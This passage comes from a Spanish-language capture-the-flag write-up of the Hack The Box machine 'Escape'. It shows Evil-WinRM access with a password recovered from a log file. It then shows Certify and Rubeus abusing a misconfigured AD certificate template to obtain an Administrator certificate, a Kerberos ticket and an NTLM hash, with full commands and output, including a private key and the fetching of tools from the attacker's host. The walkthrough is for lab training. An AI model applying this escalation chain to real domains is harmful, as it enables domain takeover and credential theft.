+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>Directory: C:\
+</pre></td></tr></tbody></table></code></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="rouge-code"><pre>Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         2/1/2023   8:15 PM                PerfLogs
+d-r---         2/6/2023  12:08 PM                Program Files
+d-----       11/19/2022   3:51 AM                Program Files (x86)
+d-----       11/19/2022   3:51 AM                Public
+d-----         2/1/2023   1:02 PM                SQLServer
+d-r---         2/1/2023   1:55 PM                Users
+d-----         4/3/2023  10:34 PM                Windows
+
+
+*Evil-WinRM* PS C:\&gt; 
+</pre></td></tr></tbody></table></code></div></div>
+<p>Una carpeta llamada <code class="language-plaintext highlighter-rouge">SQLServer</code> y otra <code class="language-plaintext highlighter-rouge">Logs</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\S</span>QLServer<span class="se">\L</span>ogs&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\S</span>QLServer<span class="se">\L</span>ogs
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\S</span>QLServer<span class="se">\L</span>ogs&gt; 
+</pre></td></tr></tbody></table></code></div></div>
+<p>Vemos que tenemos otro usuario y su contraseña.
+<img data-src="/assets/img/commons/escape-writeup/4.png" alt="Hacker " class="center-image" data-proofer-ignore>
+<em>ERROLOG.BAK</em></p>
+
+<p>Nos conectamos.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre>❯ evil-winrm <span class="nt">-i</span> 10.10.11.202 <span class="nt">-u</span> Ryan.Cooper <span class="nt">-p</span> NuclearMosquito3
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; 
+</pre></td></tr></tbody></table></code></div></div>
+<p>Procedemos a leer la primera flag.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ../Desktop/user.txt
+12<span class="k">****************************</span>a6
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; 
+</pre></td></tr></tbody></table></code></div></div>
+<p><img data-src="/assets/img/commons/escape-writeup/gato.gif" alt="Hacker " class="center-image" data-proofer-ignore>
+<em>Pwned</em></p>
+
+<h2 id="escalada-de-privilegios"><span class="mr-2">Escalada de Privilegios</span><a href="#escalada-de-privilegios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>Importamos y ejecutamos <code class="language-plaintext highlighter-rouge">Certify.exe</code> para descubrir plantillas de certificados vulnerables. Todo lo descargaremos de este repositorio de <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">GitHub</a>.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+</pre></td><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; wget http://10.10.14.15/Certify.exe <span class="nt">-o</span> Certify.exe
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; .<span class="se">\C</span>ertify.exe find /vulnerable /currentuser
+
+   _____          _   _  __
+  / ____|        | | <span class="o">(</span>_<span class="o">)</span>/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ <span class="se">\ </span><span class="s1">'__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Find certificate templates
+[*] Using current user'</span>s unrolled group SIDs <span class="k">for </span>vulnerability checks.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the search base <span class="s1">'CN=Configuration,DC=sequel,DC=htb'</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Listing info about the Enterprise CA <span class="s1">'sequel-DC-CA'</span>
+
+    Enterprise CA Name            : sequel-DC-CA
+    DNS Hostname                  : dc.sequel.htb
+    FullName                      : dc.sequel.htb<span class="se">\s</span>equel-DC-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : <span class="nv">CN</span><span class="o">=</span>sequel-DC-CA, <span class="nv">DC</span><span class="o">=</span>sequel, <span class="nv">DC</span><span class="o">=</span>htb
+    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
+    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
+    Cert Start Date               : 11/18/2022 12:58:46 PM
+    Cert End Date                 : 11/18/2121 1:08:46 PM
+    Cert Chain                    : <span class="nv">CN</span><span class="o">=</span>sequel-DC-CA,DC<span class="o">=</span>sequel,DC<span class="o">=</span>htb
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN<span class="se">\A</span>dministrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY<span class="se">\A</span>uthenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN<span class="se">\A</span>dministrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               sequel<span class="se">\D</span>omain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+      Allow  ManageCA, ManageCertificates               sequel<span class="se">\E</span>nterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+    Enrollment Agent Restrictions : None
+
+<span class="o">[!]</span> Vulnerable Certificates Templates :
+
+    CA Name                               : dc.sequel.htb<span class="se">\s</span>equel-DC-CA
+    Template Name                         : UserAuthentication
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : sequel<span class="se">\D</span>omain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel<span class="se">\D</span>omain Users           S-1-5-21-4078382237-1492182817-2568127209-513
+                                      sequel<span class="se">\E</span>nterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+      Object Control Permissions
+        Owner                       : sequel<span class="se">\A</span>dministrator          S-1-5-21-4078382237-1492182817-2568127209-500
+        WriteOwner Principals       : sequel<span class="se">\A</span>dministrator          S-1-5-21-4078382237-1492182817-2568127209-500
+                                      sequel<span class="se">\D</span>omain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel<span class="se">\E</span>nterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+        WriteDacl Principals        : sequel<span class="se">\A</span>dministrator          S-1-5-21-4078382237-1492182817-2568127209-500
+                                      sequel<span class="se">\D</span>omain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel<span class="se">\E</span>nterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+        WriteProperty Principals    : sequel<span class="se">\A</span>dministrator          S-1-5-21-4078382237-1492182817-2568127209-500
+                                      sequel<span class="se">\D</span>omain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel<span class="se">\E</span>nterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+
+
+
+Certify completed <span class="k">in </span>00:00:10.0967993
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; 
+
+</pre></td></tr></tbody></table></code></div></div>
+<p>Usando esta <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin">guía</a>.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>certify.exe request /ca:&lt;<span class="nv">$certificateAuthorityHost</span><span class="o">&gt;</span> /template:&lt;<span class="nv">$vulnerableCertificateTemplateName</span><span class="o">&gt;</span> /altname:&lt;<span class="nv">$adUserToImpersonate</span><span class="o">&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+<ul>
+  <li>/ca - Especificamos el servidor de la Autoridad de Certificación al que enviamos la solicitud;</li>
+  <li>/template - Especificamos la plantilla de certificado que debe utilizarse para generar el nuevo certificado;</li>
+  <li>/altname - Especificamos el usuario AD para el que debe generarse el nuevo certificado.
+```bash
+<em>Evil-WinRM</em> PS C:\Users\Ryan.Cooper\Documents&gt; .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator</li>
+</ul>
+
+<hr />
+<p>/ <strong>__|        | | (<em>)/ _|
+ | |     __</em> _ __| |_ <em>| |</em> _   _
+ | |    / _ \ ‘</strong>| <strong>| |  <em>| | | |
+ | |</em></strong>|  <strong>/ |  | |<em>| | | | |</em>| |
+  _</strong><strong>_</strong>|<em>|   _</em>|<em>|</em>|  _<em>, |
+                             <strong>/ |
+                            |</strong></em>./
+  v1.0.0</p>
+
+<p>[*] Action: Request a Certificates</p>
+
+<p>[<em>] Current user context    : sequel\Ryan.Cooper
+[</em>] No subject name specified, using current context as subject.</p>
+
+<p>[<em>] Template                : UserAuthentication
+[</em>] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
+[*] AltName                 : Administrator</p>
+
+<p>[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA</p>
+
+<p>[<em>] CA Response             : The certificate had been issued.
+[</em>] Request ID              : 15</p>
+
+<p>[*] cert.pem         :</p>
+
+<p>—–BEGIN RSA PRIVATE KEY—–
+MIIEpAIBAAKCAQEAuQ0JwtjXqi8KxN4BpNub59Zm/VWwObmc7Fl81iWzpJR83hJf
+oPJw5NeORh91QJ+mlu1jxUg0J291PAYFgvTnBu/FqxkB3bhzEYlZTHSp5ds5WqR3
+jSlFOhVEE0UyAcmxBhxzZWGIvem/I3an3g23n02CQenEOTxlNlnYX0bZcYwbs/ao
+DUak9oZxTDNk4mbp3H7jcdjnw29NnjCIbuq/2tocbL98p4Wn+9YHkmOMmUk38Wqg
+2YQjbC60KBj9Ww+D1a8yNHyLXP3e7loC6zi7XUGjZeNhWb5x9yHXeFiGvsHvl9Ik
+/6mqFa1yoclEPS696e74nqOTEyVXMQRkpKYiHQIDAQABAoIBAQCCkzSkDKaBK5iJ
+ua2nSl8EhEE/2Ur0MIkOLUbtRMUyCKTjfkuEIg6PK5r02BXAd+bw8KlJ99z1RqyO
+oiEZev3Z4y6zwH2UmiZ35VbhoCCSVNJvp0XEka6LgZ37iwPyRwNmsISssNnwSBPb
+Tkq9YSiEfAjBwdX4HSm95D/NWwzsFSDxRJviQgwL5VOObtqmkaN3l96x2r1euL5d
+5YYtnOvgZnnAjHTMG0KVSnQRXJvyoMDptGi5Tk6xRGj+rlLjVZv+D/zbg4Q0smWW
+xHmTimYUm8nxDtO0G0Lakg31iKM9l8SHdDUoWexObVUhRjLePnMubjht8/W+Gr8M
+7c/1QLTxAoGBAOxfL9gOT72pJ7Vytr1s0HUJgZ4rqFzDyAcFweOSbPY3VHsO2Swe
+H+y4LEXKbva6PoasorF/jMCAW3aBARlyz7ge3I1MI+Q3bGp625lkRQ6IQsDhJLgq
+jRRMVVEAkQSmPaDYji70jbtEKOA5WBeFPrNyPBfxNk6APfzg9KkFVEdnAoGBAMhq
+3f2Bxu2aMzmadBQhnkip1BI5XFMlFhNL8w+p67ixFTfs3hHeI9FcQjqeY3ND7FvI
+D92PjwvxuGP3QZmKW76VvZ0pAMRrTjb/Kbvg4FtqirqALdEMY51zxHv5ZHqCp9ux
+u1U2cuiYHPF0iT5onNcXCPSVWtL3efU61+Heg2vbAoGBAND+ULU94i+V0vBSH1VZ
+Uu9ImnyZqWFsEf5zjr2CiCkjPuUXednSQPPy2+JRXM92WTaGictbNb43P6eF5Mz1
+gMgRMX0VZ16vyoJTYrs7tvtka3FTID5eESNzYrQeRhrQSglfsEfAH1kGqQWobkVN
+oOTVCmE4+4VpSmW/GVQgzCXdAoGACvm3QHvL7hUkuwHXW4bfyTDruTfE85SzWckt
+/WybyRiBhfeFzcqxgXSg997WqWhN2FTjcYm8FrZdF7RhtkvabFx87s9hCGCr/t0I
+Zw6QmtEB2ebNG4anKec+Gl/0/bSMBr77+FWsA0rZQuvT3EQUWr8bMXHAcI828ZQQ
+YIE0B0MCgYBMNfQ+9fiFnWALqU73ehVc0kPvJznmSXX0Z+XIHjbqpzQs9bQ7h6Wq
+HNzaZVaueOrv9QJ+TvEKAfkUbbpoV+v2OwVckjqGCwf5SbkhHfx1j4tYNRauH7Hf
+2r23b/ZRy23efeU/ZYZs2YY71K6fURET7hrgFG020HRn+NxGJHEA5g==
+—–END RSA PRIVATE KEY—–
+—–BEGIN CERTIFICATE—–
+MIIGEjCCBPqgAwIBAgITHgAAAA/pJjUBjj+lpAAAAAAADzANBgkqhkiG9w0BAQsF
+ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
+MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwNDA0MDk0MzExWhcNMjUwNDA0
+MDk1MzExWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
+c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
+MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC5DQnC2NeqLwrE3gGk25vn1mb9
+VbA5uZzsWXzWJbOklHzeEl+g8nDk145GH3VAn6aW7WPFSDQnb3U8BgWC9OcG78Wr
+GQHduHMRiVlMdKnl2zlapHeNKUU6FUQTRTIBybEGHHNlYYi96b8jdqfeDbefTYJB
+6cQ5PGU2WdhfRtlxjBuz9qgNRqT2hnFMM2TiZuncfuNx2OfDb02eMIhu6r/a2hxs
+v3ynhaf71geSY4yZSTfxaqDZhCNsLrQoGP1bD4PVrzI0fItc/d7uWgLrOLtdQaNl
+42FZvnH3Idd4WIa+we+X0iT/qaoVrXKhyUQ9Lr3p7vieo5MTJVcxBGSkpiIdAgMB
+AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
+lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
+KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
+CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
+hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
+Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFBLtgmmZo1k7Vpapf/zHk2aOicxU
+MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
+IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
+gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
+bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
+bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
+ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
+gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
+QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
+bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
+b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
+AAOCAQEAO1EjXikuDc35DAjKsZPszKi6Aq1dS85i+cbbrNwOK99g8fiYnDnIdOaH
+dpKDSeVGF6K9rKs6/b0J8qHKBlj8NEBpji/wacbxz4+Nlg5lfPS02S1t/IqmaIo3
+HiXPxjNa0epM3EQ0/g8eBrYdmfXGjNelv5o8vaaiOOrdymiHssm4h5gvQADkbOsE
+9YQGfV0Hknk6S/L1bJq+1PDGoMIShwLwt202CwgkCJ/0+PXbGzzcvzfnH8/3cBMt
+GfjJ2Oqm6/8/NoYJkI5gpqUQsu9fFji07S5NPeXPpcHp53j5A6mM07FYCNFOXIkH
+GcaAgmGkMVGWaw90STHR07EW6q5vfg==
+—–END CERTIFICATE—–</p>
+
+<p>[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP “Microsoft Enhanced Cryptographic Provider v1.0” -export -out cert.pfx</p>
+
+<p>Certify completed in 00:00:12.8384593
+<em>Evil-WinRM</em> PS C:\Users\Ryan.Cooper\Documents&gt;</p>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre>En nuestro Linux guardamos la información en un archivo llamado `cert.prem` y hacemos lo siguiente.
+```bash
+❯ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+Enter Export Password:
+Verifying - Enter Export Password:
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Descargamos el archivo y el binario de Rubeus.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+</pre></td><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; .<span class="se">\R</span>ubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
+
+   ______        _
+  <span class="o">(</span>_____ <span class="se">\ </span>     | |
+   _____<span class="o">)</span> <span class="o">)</span>_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ <span class="se">\|</span> ___ | | | |/___<span class="o">)</span>
+  | |  <span class="se">\ \|</span> |_| | |_<span class="o">)</span> <span class="o">)</span> ____| |_| |___ |
+  |_|   |_|____/|____/|_____<span class="o">)</span>____/<span class="o">(</span>___/
+
+  v2.2.0
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Action: Ask TGT
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using PKINIT with etype rc4_hmac and subject: <span class="nv">CN</span><span class="o">=</span>Ryan.Cooper, <span class="nv">CN</span><span class="o">=</span>Users, <span class="nv">DC</span><span class="o">=</span>sequel, <span class="nv">DC</span><span class="o">=</span>htb
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Building AS-REQ <span class="o">(</span>w/ PKINIT preauth<span class="o">)</span> <span class="k">for</span>: <span class="s1">'sequel.htb\Administrator'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using domain controller: fe80::ac1b:a74a:c865:d5a0%4:88
+<span class="o">[</span>+] TGT request successful!
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nb">base64</span><span class="o">(</span>ticket.kirbi<span class="o">)</span>:
+
+      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
+      <span class="nv">NDc1NVqoDBsKU0VRVUVMLkhUQqkfMB2gAwIBAqEWMBQbBmtyYnRndBsKc2VxdWVsLmh0Yg</span><span class="o">==</span>
+
+  ServiceName              :  krbtgt/sequel.htb
+  ServiceRealm             :  SEQUEL.HTB
+  UserName                 :  Administrator
+  UserRealm                :  SEQUEL.HTB
+  StartTime                :  4/4/2023 7:47:55 PM
+  EndTime                  :  4/5/2023 5:47:55 AM
+  RenewTill                :  4/11/2023 7:47:55 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable
+  KeyType                  :  rc4_hmac
+  Base64<span class="o">(</span>key<span class="o">)</span>              :  <span class="nv">RJRD36btjbbDzaug9HCMbQ</span><span class="o">==</span>
+  ASREP <span class="o">(</span>key<span class="o">)</span>              :  D7DB92B28474C13C0F2172CE2F52A8F5
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting credentials using U2U
+
+  CredentialInfo         :
+    Version              : 0
+    EncryptionType       : rc4_hmac
+    CredentialData       :
+      CredentialCount    : 1
+       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; 
+</pre></td></tr></tbody></table></code></div></div>
+<p>Nos conectamos usando el hash <code class="language-plaintext highlighter-rouge">NTLM</code></p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
